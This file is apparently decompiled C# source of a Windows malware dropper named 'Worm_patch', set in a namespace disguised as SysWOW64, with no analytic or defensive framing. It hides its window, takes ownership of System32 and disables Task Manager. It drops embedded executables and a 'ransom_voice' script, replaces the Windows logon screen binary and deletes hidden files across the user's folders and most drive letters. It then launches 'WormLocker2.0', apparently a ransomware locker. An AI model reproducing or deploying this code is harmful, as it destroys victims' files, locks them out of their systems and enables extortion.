using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Windows.Forms;
using Microsoft.Win32;

namespace SysWOW64;

public class Worm_patch : Form
{
	private IContainer components = null;

	private Timer cmd_get;

	private Timer tmr_start_worm;

	public Worm_patch()
	{
		InitializeComponent();
		((Form)this).set_TransparencyKey(((Control)this).get_BackColor());
		((Form)this).set_TopMost(true);
		((Form)this).set_Opacity(1.0);
		Process.Start(new ProcessStartInfo
		{
			FileName = "cmd.exe",
			WindowStyle = ProcessWindowStyle.Hidden,
			Arguments = "/k takeown /f C:\\Windows\\System32 && icacls C:\\Windows\\System32 /grant \"%username%:F\""
		});
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey.SetValue("DisableTaskMgr", 1, RegistryValueKind.String);
	}

	private void Worm_patch_Load(object sender, EventArgs e)
	{
		cmd_get.Start();
		tmr_start_worm.Start();
	}

	public static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
	{
		Assembly callingAssembly = Assembly.GetCallingAssembly();
		using Stream stream = callingAssembly.GetManifestResourceStream(nameSpace + "." + ((internalFilePath == "") ? "" : (internalFilePath + ".")) + resourceName);
		using BinaryReader binaryReader = new BinaryReader(stream);
		using FileStream output = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate);
		using BinaryWriter binaryWriter = new BinaryWriter(output);
		binaryWriter.Write(binaryReader.ReadBytes((int)stream.Length));
	}

	private void cmd_get_Tick(object sender, EventArgs e)
	{
		cmd_get.Stop();
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		string text2 = text;
		Extract("SysWOW64", "C:\\Windows\\System32", "Script", "LogonUIinf.exe");
		Extract("SysWOW64", "C:\\Windows\\System32", "Script", "ransom_voice.vbs");
		Extract("SysWOW64", "C:\\Windows\\System32", "Script", "WormLocker2.0.exe");
		File.Copy("C:\\Windows\\System32\\LogonUI.exe", "C:\\Windows\\System32\\LogonUItrue.exe");
		File.Delete("C:\\Windows\\System32\\LogonUI.exe");
		File.Copy("C:\\Windows\\System32\\LogonUIinf.exe", "C:\\Windows\\System32\\LogonUI.exe");
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string[] array = (from f in Directory.EnumerateFiles(folderPath + "\\")
			where (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden
			select f).ToArray();
		string[] array2 = array;
		foreach (string path in array2)
		{
			File.Delete(path);
		}
		string text3 = text2;
		string[] array3 = (from f in Directory.EnumerateFiles(text3 + "\\")
			where (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden
			select f).ToArray();
		string[] array4 = array3;
		foreach (string path2 in array4)
		{
			File.Delete(path2);
		}
		string text4 = "A:\\";
		string text5 = "B:\\";
		string text6 = "D:\\";
		string text7 = "E:\\";
		string text8 = "F:\\";
		string text9 = "G:\\";
		string text10 = "H:\\";
		string text11 = "I:\\";
		string text12 = "J:\\";
		string text13 = "K:\\";
		string text14 = "L:\\";
		string text15 = "M:\\";
		string text16 = "O:\\";
		string text17 = "P:\\";
		string text18 = "Q:\\";
		string text19 = "R:\\";
		string text20 = "S:\\";
		string text21 = "T:\\";
		string text22 = "U:\\";
		if (Directory.Exists(text4))
		{
			string[] array5 = (from f in Directory.EnumerateFiles(text4 + "\\")
				where (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden
				select f).ToArray();
			string[] array6 = array5;
			foreach (string path3 in array6)
			{
				File.Delete(path3);
			}
		}
		if (Directory.Exists(text5))
		{
			string[] array7 = (from f in Directory.EnumerateFiles(text5 + "\\")
				where (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden
				select f).ToArray();
			string[] array8 = array7;
			foreach (string path4 in array8)
			{
				File.Delete(path4);
			}
		}
		if (Directory.Exists(text6))
		{
			string[] array9 = (from f in Directory.EnumerateFiles(text6 + "\\")
				where (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden
				select f).ToArray();
			string[] array10 = array9;
			foreach (string path5 in array10)
			{
				File.Delete(path5);
			}
		}
		if (Directory.Exists(text7))
		{
			string[] array11 = (from f in Directory.EnumerateFiles(text7 + "\\")
				where (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden
				select f).ToArray();
			string[] array12 = array11;
			foreach (string path6 in array12)
			{
				File.Delete(path6);
			}
		}
		if (Directory.Exists(text8))
		{
			string[] array13 = (from f in Directory.EnumerateFiles(text8 + "\\")
				where (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden
				select f).ToArray();
			string[] array14 = array13;
			foreach (string path7 in array14)
			{
				File.Delete(path7);
			}
		}
		if (Directory.Exists(text9))
		{
			string[] array15 = (from f in Directory.EnumerateFiles(text9 + "\\")
				where (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden
				select f).ToArray();
			string[] array16 = array15;
			foreach (string path8 in array16)
			{
				File.Delete(path8);
			}
		}
		if (Directory.Exists(text10))
		{
			string[] array17 = (from f in Directory.EnumerateFiles(text10 + "\\")
				where (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden
				select f).ToArray();
			string[] array18 = array17;
			foreach (string path9 in array18)
			{
				File.Delete(path9);
			}
		}
		if (Directory.Exists(text11))
		{
			string[] array19 = (from f in Directory.EnumerateFiles(text11 + "\\")
				where (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden
				select f).ToArray();
			string[] array20 = array19;
			foreach (string path10 in array20)
			{
				File.Delete(path10);
			}
		}
		if (Directory.Exists(text12))
		{
			string[] array21 = (from f in Directory.EnumerateFiles(text12 + "\\")
				where (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden
				select f).ToArray();
			string[] array22 = array21;
			foreach (string path11 in array22)
			{
				File.Delete(path11);
			}
		}
		if (Directory.Exists(text13))
		{
			string[] array23 = (from f in Directory.EnumerateFiles(text13 + "\\")
				where (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden
				select f).ToArray();
			string[] array24 = array23;
			foreach (string path12 in array24)
			{
				File.Delete(path12);
			}
		}
		if (Directory.Exists(text14))
		{
			string[] array25 = (from f in Directory.EnumerateFiles(text14 + "\\")
				where (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden
				select f).ToArray();
			string[] array26 = array25;
			foreach (string path13 in array26)
			{
				File.Delete(path13);
			}
		}
		if (Directory.Exists(text15))
		{
			string[] array27 = (from f in Directory.EnumerateFiles(text15 + "\\")
				where (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden
				select f).ToArray();
			string[] array28 = array27;
			foreach (string path14 in array28)
			{
				File.Delete(path14);
			}
		}
		if (Directory.Exists(text16))
		{
			string[] array29 = (from f in Directory.EnumerateFiles(text16 + "\\")
				where (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden
				select f).ToArray();
			string[] array30 = array29;
			foreach (string path15 in array30)
			{
				File.Delete(path15);
			}
		}
		if (Directory.Exists(text17))
		{
			string[] array31 = (from f in Directory.EnumerateFiles(text17 + "\\")
				where (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden
				select f).ToArray();
			string[] array32 = array31;
			foreach (string path16 in array32)
			{
				File.Delete(path16);
			}
		}
		if (Directory.Exists(text18))
		{
			string[] array33 = (from f in Directory.EnumerateFiles(text18 + "\\")
				where (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden
				select f).ToArray();
			string[] array34 = array33;
			foreach (string path17 in array34)
			{
				File.Delete(path17);
			}
		}
		if (Directory.Exists(text19))
		{
			string[] array35 = (from f in Directory.EnumerateFiles(text19 + "\\")
				where (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden
				select f).ToArray();
			string[] array36 = array35;
			foreach (string path18 in array36)
			{
				File.Delete(path18);
			}
		}
		if (Directory.Exists(text20))
		{
			string[] array37 = (from f in Directory.EnumerateFiles(text20 + "\\")
				where (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden
				select f).ToArray();
			string[] array38 = array37;
			foreach (string path19 in array38)
			{
				File.Delete(path19);
			}
		}
		if (Directory.Exists(text21))
		{
			string[] array39 = (from f in Directory.EnumerateFiles(text21 + "\\")
				where (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden
				select f).ToArray();
			string[] array40 = array39;
			foreach (string path20 in array40)
			{
				File.Delete(path20);
			}
		}
		if (Directory.Exists(text22))
		{
			string[] array41 = (from f in Directory.EnumerateFiles(text22 + "\\")
				where (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden
				select f).ToArray();
			string[] array42 = array41;
			foreach (string path21 in array42)
			{
				File.Delete(path21);
			}
		}
	}

	private void tmr_start_worm_Tick(object sender, EventArgs e)
	{
		tmr_start_worm.Stop();
		Process.Start("C:\\Windows\\System32\\WormLocker2.0.exe");
		((Form)this).Close();
		Application.Exit();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		components = new Container();
		cmd_get = new Timer(components);
		tmr_start_worm = new Timer(components);
		((Control)this).SuspendLayout();
		cmd_get.set_Enabled(true);
		cmd_get.set_Interval(10000);
		cmd_get.add_Tick((EventHandler)cmd_get_Tick);
		tmr_start_worm.set_Enabled(true);
		tmr_start_worm.set_Interval(15000);
		tmr_start_worm.add_Tick((EventHandler)tmr_start_worm_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(50, 50));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Worm_patch");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("ff0953qpn7361bbu");
		((Form)this).set_TopMost(true);
		((Form)this).add_Load((EventHandler)Worm_patch_Load);
		((Control)this).ResumeLayout(false);
	}
}
